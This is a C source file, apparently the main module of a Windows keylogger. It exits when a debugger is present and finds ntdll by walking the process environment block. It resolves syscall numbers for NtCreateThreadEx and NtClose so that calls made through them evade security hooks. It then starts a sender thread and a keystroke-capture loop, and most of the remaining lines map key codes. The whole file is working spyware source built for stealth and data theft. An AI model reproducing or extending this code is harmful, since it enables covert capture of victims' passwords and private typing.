#include <stdbool.h>
#include <stdio.h>
#include <windows.h>

#include "regedit/regedit.h"
#include "keylogger/keylogger.h"
#include "utils/utils.h"
#include "hash-tables/PressedKeys.h"
#include "sets/Set.h"
#include "main.h"
#include "sender/sender.h"


DWORD getProcessPID(const char* processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (_stricmp(entry.szExeFile, processName) == 0) {
                NtClose(snapshot);
                return entry.th32ProcessID;
            }
        }
    }
    NtClose(snapshot);
    return 0;
}

VOID IndirectPrelude(HMODULE NtdllHandle, char NtFunctionName[], PDWORD NtFunctionSSN, PUINT_PTR NtFunctionSyscall) {
    DWORD SyscallNumber = 0;
    UINT_PTR NtFunctionAddress = 0;
    UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };
    
    NtFunctionAddress = getAddr(NtdllHandle, NtFunctionName);
    if (NtFunctionAddress == 0) {
        exit(0);
    }

    *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];
    *NtFunctionSyscall = NtFunctionAddress + 0x12;

    if (memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes)) != 0) {
        exit(0);
    }
}

void isDebuggerModeOn() {
    if (_checkDebugger() != 0) {
        exit(0);
    }
}

UINT_PTR getAddr(HMODULE module, char target[]) {
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)module;

    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)module + dosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY exportDirectoryEntry = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)module + exportDirectoryEntry.VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)module + exportDirectory->AddressOfNames);
    WORD* nameOrdinals = (WORD*)((BYTE*)module + exportDirectory->AddressOfNameOrdinals);
    DWORD* functionRVAs = (DWORD*)((BYTE*)module + exportDirectory->AddressOfFunctions);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)module + nameRVAs[i]);
        if (strcmp(name, target) == 0) {
            WORD ordinal = nameOrdinals[i];
            DWORD functionRVA = functionRVAs[ordinal];
            return (UINT_PTR)module + functionRVA;
        }
    }
}

HMODULE getModuleHandle() {
    PPEB pPEB = _getPeb();
    PLIST_ENTRY hdr = &(pPEB->Ldr->InLoadOrderModuleList);
    PLIST_ENTRY ent = hdr->Flink;
    PLDR_DATA_TABLE_ENTRY entry = NULL;

    for (; hdr != ent; ent = ent->Flink){
        entry = (PLDR_DATA_TABLE_ENTRY)ent;
        if (wcscmp(entry->FullDllName.Buffer, L"C:\\Windows\\SYSTEM32\\ntdll.dll") == 0) {
            return (HMODULE)entry->DllBase;
        }
    }
    return NULL;
}

int main() {
    BOOL State = TRUE;
    NTSTATUS Status = 0;
    HMODULE NtdllHandle = NULL;
    PVOID Buffer = NULL;
    HANDLE thread = NULL;
    HANDLE procH = NULL;
    OBJECT_ATTRIBUTES OA;

    isDebuggerModeOn();

    NtdllHandle = getModuleHandle();
    if (NtdllHandle == NULL) {
        exit(0);
    } 

    IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
    IndirectPrelude(NtdllHandle, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall);

    KeysCombinations* combinations = createCombinationTable();
    PressedKeys* pressedKeys = createTablePK();
    Keys* keys = createTable();
    Set* set = createSet();
    
    initKeysCombinations(combinations);
    initKeys(keys);

    result = malloc(sizeof(char) * 3000);
    if (result == NULL) {
        exit(0);
    }

    userId = malloc(sizeof(char) * 37);
    if (userId == NULL) { 
        exit(0);
    }

    LPBYTE tempUserId = getOrCreateAndGetUserId();
    wcstombs(userId, (wchar_t*)tempUserId, 37 * sizeof(char));
    strcpy(result, "");

    Status = NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (long int (*)(void *))send_, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        State = FALSE; goto CLEANUP;
    }
    start(pressedKeys, keys, combinations, set);

CLEANUP:
    if (thread) {
        NtClose(thread);
    }

    if (procH) {
        NtClose(procH);
    }

    if (userId != NULL) {
        free(userId);
        userId = NULL;
    }

    if (result != NULL) {
        free(result);
        result = NULL;
    }

    if (State) {
        exit(0);
    }

    return 0;
}

void initKeysCombinations(KeysCombinations *table) {
    insertCombination(table, "`", '~');
    insertCombination(table, "0", ')');
    insertCombination(table, "1", '!');
    insertCombination(table, "2", '@');
    insertCombination(table, "3", '#');
    insertCombination(table, "4", '$');
    insertCombination(table, "5", '%');
    insertCombination(table, "6", '^');
    insertCombination(table, "7", '&');
    insertCombination(table, "8", '*');
    insertCombination(table, "9", '(');
    insertCombination(table, "-", '_');
    insertCombination(table, "=", '+');
    insertCombination(table, "[", '{');
    insertCombination(table, "]", '}');
    insertCombination(table, "\\", '|');
    insertCombination(table, ";", ':');
    insertCombination(table, "'", '\'');
    insertCombination(table, ",", '<');
    insertCombination(table, ".", '>');
    insertCombination(table, "/", '?');
}

void initKeys(Keys *table) {
    insert(table, "0", 0x30);
    insert(table, "1", 0x31);
    insert(table, "2", 0x32);
    insert(table, "3", 0x33);
    insert(table, "4", 0x34);
    insert(table, "5", 0x35);
    insert(table, "6", 0x36);
    insert(table, "7", 0x37);
    insert(table, "8", 0x38);
    insert(table, "9", 0x39);
    insert(table, "A", 0x41);
    insert(table, "B", 0x42);
    insert(table, "C", 0x43);
    insert(table, "D", 0x44);
    insert(table, "E", 0x45);
    insert(table, "F", 0x46);
    insert(table, "G", 0x47);
    insert(table, "H", 0x48);
    insert(table, "I", 0x49);
    insert(table, "J", 0x4A);
    insert(table, "K", 0x4B);
    insert(table, "L", 0x4C);
    insert(table, "M", 0x4D);
    insert(table, "N", 0x4E);
    insert(table, "O", 0x4F);
    insert(table, "P", 0x50);
    insert(table, "Q", 0x51);
    insert(table, "R", 0x52);
    insert(table, "S", 0x53);
    insert(table, "T", 0x54);
    insert(table, "U", 0x55);
    insert(table, "V", 0x56);
    insert(table, "W", 0x57);
    insert(table, "X", 0x58);
    insert(table, "Y", 0x59);
    insert(table, "Z", 0x5A);
    insert(table, "-", 0xBD);
    insert(table, "=", 0xBB);
    insert(table, "[", 0xDB);
    insert(table, "]", 0xDD);
    insert(table, "\\", 0xDC);
    insert(table, ";", 0xBA);
    insert(table, "'", 0xDE);
    insert(table, ",", 0xBC);   
    insert(table, ".", 0xBE);
    insert(table, "/", 0xBF);
    insert(table, "ENTER", 0x0D);
    insert(table, "SPACE", 0x20);
    insert(table, "CAPS_LOCK", 0x14);
    insert(table, "NUM_LOCK", 0x90);
    insert(table, "BACK_SPACE", 0x08);
    insert(table, "NUMPAD0", 0x60);
    insert(table, "NUMPAD1", 0x61);
    insert(table, "NUMPAD2", 0x62);
    insert(table, "NUMPAD3", 0x63);
    insert(table, "NUMPAD4", 0x64);
    insert(table, "NUMPAD5", 0x65);
    insert(table, "NUMPAD6", 0x66);
    insert(table, "NUMPAD7", 0x67);
    insert(table, "NUMPAD8", 0x68);
    insert(table, "NUMPAD9", 0x69);
    insert(table, "MULTIPLY", 0x6A);
    insert(table, "ADD", 0x6B);
    insert(table, "SEPARATOR", 0x6C);
    insert(table, "SUBTRACT", 0x6D);
    insert(table, "DECIMAL", 0x6E);
    insert(table, "DIVIDE", 0x6F);
    insert(table, "LEFT_ARROW", 0x25);
    insert(table, "UP_ARROW", 0x26);
    insert(table, "RIGHT_ARROW", 0x27);
    insert(table, "DOWN_ARROW", 0x28);
}
